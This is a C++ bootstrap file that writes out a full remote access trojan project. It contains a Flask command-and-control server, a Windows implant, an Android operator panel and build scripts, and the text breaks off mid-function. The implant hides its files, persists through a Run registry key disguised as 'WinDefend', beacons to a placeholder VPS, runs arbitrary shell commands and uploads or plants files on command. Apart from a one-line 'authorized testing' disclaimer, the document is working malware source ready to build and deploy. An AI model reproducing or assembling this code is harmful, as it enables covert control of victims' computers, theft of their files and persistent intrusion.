// language: C++, file: src/bootstrap.cpp, target: Windows 11 x64, MSVC
// unpacks the full RAT project into .\rat\ next to itself
#include <windows.h>
#include <string>
#include <vector>
#pragma comment(lib, "user32.lib")

struct File { const char* name; const char* body; };

static const char* C2_PY = R"PY(
from flask import Flask, request, jsonify
import datetime

app = Flask(__name__)
TOKEN = "CHANGE_ME_LONG_RANDOM"

TASKS, RESULTS, IMPLANTS = {}, {}, {}

def auth(): return request.headers.get("X-Token") == TOKEN

@app.route("/beacon", methods=["POST"])
def beacon():
    iid = request.json["id"]
    IMPLANTS[iid] = datetime.datetime.now().isoformat()
    q = TASKS.get(iid)
    return jsonify({"task": q.pop(0) if q else None})

@app.route("/result", methods=["POST"])
def result():
    d = request.json
    RESULTS.setdefault(d["id"], []).append(d)
    return ("", 204)

@app.route("/panel/implants")
def panel_implants():
    if not auth(): return ("", 403)
    return jsonify(IMPLANTS)

@app.route("/panel/send", methods=["POST"])
def panel_send():
    if not auth(): return ("", 403)
    d = request.json
    TASKS.setdefault(d["id"], []).append(d["cmd"])
    return ("", 204)

@app.route("/panel/results/<iid>")
def panel_results(iid):
    if not auth(): return ("", 403)
    out = RESULTS.get(iid, [])
    RESULTS[iid] = []
    return jsonify(out)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
)PY";

static const char* IMPLANT_CPP = R"CPP(
// language: C++, file: rat/implant.cpp, target: Windows 11 x64, MSVC
#include <windows.h>
#include <winhttp.h>
#include <shlobj.h>
#include <string>
#include <sstream>
#include <random>
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

static std::string AppDataPath() {
    char p[MAX_PATH]{};
    if (FAILED(SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, p)))
        GetEnvironmentVariableA("APPDATA", p, MAX_PATH);
    return p;
}
static std::string TempPath() {
    char p[MAX_PATH]{}; GetTempPathA(MAX_PATH, p); return p;
}

static const std::string DIR      = AppDataPath();
static const std::string CFG_PATH = DIR + "\\config.ini";
static const std::string ID_PATH  = DIR + "\\svchost.dat";
static const std::string LOG_PATH = TempPath() + "run.log";

static const char* DEFAULT_HOST  = "your-vps.example.net";
static const int   DEFAULT_PORT  = 8080;
static const char* DEFAULT_TOKEN = "CHANGE_ME_LONG_RANDOM";
static const char* RUN_KEY_NAME  = "WinDefend";

struct Config { std::wstring host; int port = 8080; std::wstring token; };

static std::string ReadFile(const std::string& path) {
    HANDLE f = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ,
                           nullptr, OPEN_EXISTING, 0, nullptr);
    if (f == INVALID_HANDLE_VALUE) return {};
    DWORD sz = GetFileSize(f, nullptr), got = 0;
    std::string out(sz, 0);
    ReadFile(f, out.data(), sz, &got, nullptr);
    CloseHandle(f); out.resize(got); return out;
}
static void WriteFileRaw(const std::string& path, const std::string& data) {
    HANDLE f = CreateFileA(path.c_str(), GENERIC_WRITE, 0, nullptr,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, nullptr);
    if (f == INVALID_HANDLE_VALUE) return;
    DWORD n; WriteFile(f, data.data(), (DWORD)data.size(), &n, nullptr);
    CloseHandle(f);
}
static void Log(const std::string& msg) {
    std::string line = msg + "\r\n";
    HANDLE f = CreateFileA(LOG_PATH.c_str(), FILE_APPEND_DATA, FILE_SHARE_READ,
                           nullptr, OPEN_ALWAYS, 0, nullptr);
    if (f == INVALID_HANDLE_VALUE) return;
    DWORD n; WriteFile(f, line.data(), (DWORD)line.size(), &n, nullptr);
    CloseHandle(f);
}
static std::wstring Widen(const std::string& s) {
    if (s.empty()) return {};
    int n = MultiByteToWideChar(CP_UTF8, 0, s.data(), (int)s.size(), nullptr, 0);
    std::wstring w(n, 0);
    MultiByteToWideChar(CP_UTF8, 0, s.data(), (int)s.size(), w.data(), n);
    return w;
}
static Config ParseConfig(const std::string& raw) {
    Config c{ Widen(DEFAULT_HOST), DEFAULT_PORT, Widen(DEFAULT_TOKEN) };
    std::istringstream in(raw); std::string line;
    while (std::getline(in, line)) {
        auto eq = line.find('='); if (eq == std::string::npos) continue;
        std::string k = line.substr(0, eq), v = line.substr(eq + 1);
        while (!v.empty() && (v.back()=='\r'||v.back()=='\n'||v.back()==' '))
            v.pop_back();
        if      (k == "host")  c.host  = Widen(v);
        else if (k == "port")  c.port  = std::stoi(v);
        else if (k == "token") c.token = Widen(v);
    }
    return c;
}
static void EnsureConfig() {
    if (ReadFile(CFG_PATH).empty()) {
        std::ostringstream cfg;
        cfg << "host="  << DEFAULT_HOST  << "\n"
            << "port="  << DEFAULT_PORT  << "\n"
            << "token=" << DEFAULT_TOKEN << "\n";
        WriteFileRaw(CFG_PATH, cfg.str());
        Log("[+] wrote " + CFG_PATH);
    }
    if (ReadFile(ID_PATH).empty()) {
        std::random_device rd; std::mt19937_64 rng(rd());
        std::ostringstream id; id << std::hex << rng() << "-" << rng();
        WriteFileRaw(ID_PATH, id.str());
        Log("[+] wrote " + ID_PATH);
    }
}
static void InstallPersistence() {
    char self[MAX_PATH]{}; GetModuleFileNameA(nullptr, self, MAX_PATH);
    HKEY k;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &k) != ERROR_SUCCESS) return;
    RegSetValueExA(k, RUN_KEY_NAME, 0, REG_SZ,
                   (const BYTE*)self, (DWORD)strlen(self)+1);
    RegCloseKey(k);
}

static const char* B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static std::string B64Enc(const std::string& in) {
    std::string o; int v = 0, bits = 0;
    for (unsigned char c : in) {
        v = (v << 8) | c; bits += 8;
        while (bits >= 6) { bits -= 6; o += B64[(v >> bits) & 0x3F]; }
    }
    if (bits) o += B64[(v << (6 - bits)) & 0x3F];
    while (o.size() % 4) o += '=';
    return o;
}
static std::string B64Dec(const std::string& in) {
    int v = 0, bits = 0; std::string o;
    for (char c : in) {
        const char* p = strchr(B64, c); if (!p || c=='=') continue;
        v = (v << 6) | (int)(p - B64); bits += 6;
        if (bits >= 8) { bits -= 8; o += (char)((v >> bits) & 0xFF); }
    }
    return o;
}

static std::string RunCmd(const std::string& cmd) {
    SECURITY_ATTRIBUTES sa{ sizeof(sa), nullptr, TRUE };
    HANDLE r, w;
    if (!CreatePipe(&r, &w, &sa, 0)) return "[!] pipe";
    STARTUPINFOA si{}; si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = w; si.hStdError = w;
    PROCESS_INFORMATION pi{};
    std::string line = "cmd.exe /c " + cmd;
    if (!CreateProcessA(nullptr, line.data(), nullptr, nullptr, TRUE,
                        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        CloseHandle(r); CloseHandle(w); return "[!] spawn";
    }
    CloseHandle(w);
    std::string out; char buf[4096]; DWORD n;
    while (ReadFile(r, buf, sizeof(buf), &n, nullptr) && n) out.append(buf, n);
    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread); CloseHandle(r);
    return out;
}

static std::string HandleSpecial(const std::string& cmd, std::string& extra) {
    if (cmd.rfind("get ", 0) == 0) {
        std::string path = cmd.substr(4);
        std::string data = ReadFile(path);
        if (data.empty()) return "[!] empty or missing: " + path;
        extra = "\"file_b64\":" + B64Enc(data) + ",";
        return "[+] sending " + std::to_string(data.size()) + " bytes";
    }
    if (cmd.rfind("put ", 0) == 0) {
        auto sp = cmd.find(' ', 4);
        if (sp == std::string::npos) return "[!] usage: put <path> <b64>";
        std::string path = cmd.substr(4, sp - 4);
        std::string b64  = cmd.substr(sp + 1);
        std::string raw  = B64Dec(b64);
        WriteFileRaw(path, raw);
        return "[+] wrote " + std::to_string(raw.size()) + " bytes to " + path;
    }
    return RunCmd(cmd);
}

static std::string JsonStr(const std::string& s) {
    std::string o = "\"";
    for (char c : s) {
        if (c=='"'||c=='\\') { o+='\\'; o+=c; }
        else if (c=='\n') o += "\\n";
        else if (c=='\r') o += "\\r";
        else if (c=='\t') o += "\\t";
        else if ((unsigned char)c < 0x20) {}
        else o += c;
    }
    return o + "\"";
}
static std::string HttpPost(const Config& c, const std::wstring& path,
                            const std::string& body) {
    HINTERNET s = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!s) return {};
    HINTERNET conn = WinHttpConnect(s, c.host.c_str(), (INTERNET_PORT)c.port, 0);
    HINTERNET req  = WinHttpOpenRequest(conn, L"POST", path.c_str(),
        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    std::wstring hdr = L"X-Token: " + c.token +
                       L"\r\nContent-Type: application/json";
    WinHttpSendRequest(req, hdr.c_str(), -1, (LPVOID)body.data(),
                       (DWORD)body.size(), (DWORD)body.size(), 0);
    WinHttpReceiveResponse(req, nullptr);
    std::string resp; DWORD avail, got; char buf[4096];
    do {
        if (!WinHttpQueryDataAvailable(req, &avail) || !avail) break;
        if (!WinHttpReadData(req, buf, min(avail, sizeof(buf)), &got)) break;
        resp.append(buf, got);
    } while (got);
    WinHttpCloseHandle(req); WinHttpCloseHandle(conn); WinHttpCloseHandle(s);
    return resp;
}
static std::string ExtractTask(const std::string& body) {
    auto p = body.find("\"task\":"); if (p == std::string::npos) return "";
    p = body.find('"', p + 7);      if (p == std::string::npos) return "";
    std::string out; ++p;
    while (p < body.size() && body[p] != '"') {
        if (body[p]=='\\' && p+1 < body.size()) {
            char n = body[p+1];
            out += (n=='n'?'\n': n=='r'?'\r': n=='t'?'\t': n);
            p += 2;
        } else out += body[p++];
    }
    return out;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    EnsureConfig();
    InstallPersistence();
    Config cfg = ParseConfig(ReadFile(CFG_PATH));
    std::string id = ReadFile(ID_PATH);
    Log("[+] beacon start id=" + id);

    std::mt19937 rng((unsigned)GetTickCount64());
    std::uniform_int_distribution<int> jitter(3000, 6000);

    for (;;) {
        std::string resp = HttpPost(cfg, L"/beacon",
                                    "{\"id\":" + JsonStr(id) + "}");
        std::string task = ExtractTask(resp);
        if (!task.empty()) {
            std::string extra;
            std::string out = HandleSpecial(task, extra);
            if (out.size() > 200000) out = out.substr(0, 200000);
            std::string result = "{\"id\":"  + JsonStr(id) +
                                 ",\"cmd\":" + JsonStr(task) +
                                 ","         + extra +
                                 "\"out\":"  + JsonStr(out) + "}";
            HttpPost(cfg, L"/result", result);
        }
        Sleep(jitter(rng));
    }
    return 0;
}
)CPP";

static const char* MAIN_ACTIVITY = R"KT(
// language: Kotlin, file: rat/MainActivity.kt
package com.panel.rat

import android.content.Context
import android.os.Bundle
import android.text.method.ScrollingMovementMethod
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.*
import java.io.IOException

class MainActivity : AppCompatActivity() {
    private val http = OkHttpClient.Builder()
        .connectTimeout(15, java.util.concurrent.TimeUnit.SECONDS)
        .readTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
        .build()
    private lateinit var prefs: android.content.SharedPreferences

    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        prefs = getSharedPreferences("rat", Context.MODE_PRIVATE)
        if (!prefs.contains("url")) {
            askSetup { url, token ->
                prefs.edit().putString("url", url).putString("token", token).apply()
                buildUi()
            }
        } else buildUi()
    }

    private fun askSetup(done: (String, String) -> Unit) {
        val v = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL; setPadding(40, 80, 40, 40)
        }
        val urlIn = EditText(this).apply { hint = "https://vps.example.net:8080" }
        val tokIn = EditText(this).apply { hint = "token" }
        val okBtn = Button(this).apply { text = "Save" }
        v.addView(TextView(this).apply { text = "C2 URL:" }); v.addView(urlIn)
        v.addView(TextView(this).apply { text = "Token:"  }); v.addView(tokIn)
        v.addView(okBtn); setContentView(v)
        okBtn.setOnClickListener {
            done(urlIn.text.toString().trimEnd('/'), tokIn.text.toString())
        }
    }

    private fun buildUi() {
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL; setPadding(24, 24, 24, 24)
        }
        val spin  = Spinner(this)
        val input = EditText(this).apply { hint = "команда" }
        val send  = Button(this).apply { text = "Send" }
        val out   = TextView(this).apply {
            textSize = 12f; setTextIsSelectable(true)
            movementMethod = ScrollingMovementMethod()
        }
        val scroll  = ScrollView(this).apply { addView(out) }
        val refresh = Button(this).apply { text = "Refresh implants" }
        root.addView(refresh); root.addView(spin); root.addView(input); root.addView(send)
        root.addView(scroll, LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f))
        setContentView(root)

        val ids = mutableListOf<String>()
        val adapter = ArrayAdapter(this,
            android.R.layout.simple_spinner_dropdown_item, ids)
        spin.adapter = adapter

        fun refreshList() = CoroutineScope(Dispatchers.IO).launch {
            try {
                val r = http.newCall(auth(Request.Builder()
                    .url("${prefs.getString("url", "")}/panel/implants"))
                    .build()).execute()
                val obj = JSONObject(r.body!!.string())
                val list = obj.keys().asSequence().toList()
                withContext(Dispatchers.Main) {
                    ids.clear(); ids.addAll(list); adapter.notifyDataSetChanged()
                }
            } catch (e: IOException) {
                withContext(Dispatchers.Main) { out.text = "[!] C2 unreachable: ${e.message}" }
            }
        }
        refresh.setOnClickListener { refreshList() }

        send.setOnClickListener {
            val id = ids.getOrNull(spin.selectedItemPosition) ?: return@setOnClickListener
            val cmd = input.text.toString(); if (cmd.isBlank()) return@setOnClickListener
            input.setText("")
            CoroutineScope(Dispatchers.IO).launch {
                try {
                    val body = JSONObject().put("id", id).put("cmd", cmd)
                        .toString().toRequestBody("application/json".toMediaType())
                    http.newCall(auth(Request.Builder()
                        .url("${prefs.getString("url", "")}/panel/send")
                        .post(body)).build()).execute()
                    delay(5000)
                    val r = http.newCall(auth(Request.Builder()
                        .url("${prefs.getString("url", "")}/panel/results/$id"))
                        .build()).execute()
                    val arr = JSONArray(r.body!!.string())
                    val sb = StringBuilder(out.text)
                    for (i in 0 until arr.length()) {
                        val o = arr.getJSONObject(i)
                        sb.append("$ ").append(o.optString("cmd")).append("\n")
                        sb.append(o.optString("out")).append("\n\n")
                    }
                    withContext(Dispatchers.Main) { out.text = sb.toString() }
                } catch (e: IOException) {
                    withContext(Dispatchers.Main) { out.append("\n[!] ${e.message}\n") }
                }
            }
        }
        CoroutineScope(Dispatchers.IO).launch {
            while (isActive) { refreshList(); delay(10000) }
        }
    }

    private fun auth(b: Request.Builder) =
        b.header("X-Token", prefs.getString("token", "") ?: "")
}
)KT";

static const char* MANIFEST = R"XML(
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-permission android:name="android.permission.INTERNET"/>
    <application
        android:label="Panel"
        android:usesCleartextTraffic="true"
        android:theme="@style/Theme.AppCompat.DayNight">
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
</manifest>
)XML";

static const char* BUILD_GRADLE = R"GR(
plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
}

android {
    namespace = "com.panel.rat"
    compileSdk = 34
    defaultConfig {
        applicationId = "com.panel.rat"
        minSdk = 26
        targetSdk = 34
        versionCode = 1
        versionName = "0.1"
    }
    buildTypes { release { isMinifyEnabled = false } }
    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_17
        targetCompatibility = JavaVersion.VERSION_17
    }
    kotlinOptions { jvmTarget = "17" }
}

dependencies {
    implementation("androidx.appcompat:appcompat:1.7.0")
    implementation("com.squareup.okhttp3:okhttp:4.12.0")
    implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.8.0")
}
)GR";

static const char* SETTINGS_GRADLE = R"SG(
pluginManagement {
    repositories { google(); mavenCentral(); gradlePluginPortal() }
}
dependencyResolutionManagement {
    repositories { google(); mavenCentral() }
}
rootProject.name = "rat-panel"
include(":app")
)SG";

static const char* BUILD_BAT = R"BAT(
@echo off
cl /std:c++20 /O2 /GS- /utf-8 implant.cpp ^
   /link winhttp.lib shell32.lib advapi32.lib ^
   /SUBSYSTEM:WINDOWS /ENTRY:WinMainCRTStartup ^
   /OUT:implant.exe
echo.
echo [+] built implant.exe
pause
)BAT";

static const char* RUN_C2_BAT = R"BAT(
@echo off
pip install flask
set RAT_TOKEN=CHANGE_ME_LONG_RANDOM
python c2.py
pause
)BAT";

static const char* README_MD = R"MD(
# rat project

Auto-generated by bootstrap.exe.

- c2.py            — Flask C2, run on VPS
- implant.cpp      — Windows beacon (compile with build.bat)
- MainActivity.kt  — Android panel
- AndroidManifest.xml
- build.gradle.kts
- settings.gradle.kts
- build.bat        — builds implant.exe
- run_c2.bat       — runs C2

Lab / authorized testing only.
)MD";

static const std::vector<File> FILES = {
    { "c2.py",               C2_PY          },
    { "implant.cpp",         IMPLANT_CPP    },
    { "MainActivity.kt",     MAIN_ACTIVITY  },
    { "AndroidManifest.xml", MANIFEST       },
    { "build.gradle.kts",    BUILD_GRADLE   },
    { "settings.gradle.kts", SETTINGS_GRADLE},
    { "build.bat",           BUILD_BAT      },
    { "run_c2.bat",          RUN_C2_BAT     },
    { "README.md",           README_MD      },
};

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    char self[MAX_PATH]{};
    GetModuleFileNameA(nullptr, self, MAX_PATH);
    std::string dir(self);
    auto slash = dir.find_last_of("\\/");
    if (slash != std::string::npos) dir = dir.substr(0, slash);
    std::string root = dir + "\\rat";

    CreateDirectoryA(root.c_str(), nullptr);

    std::string report;
    for (const auto& f : FILES) {
 
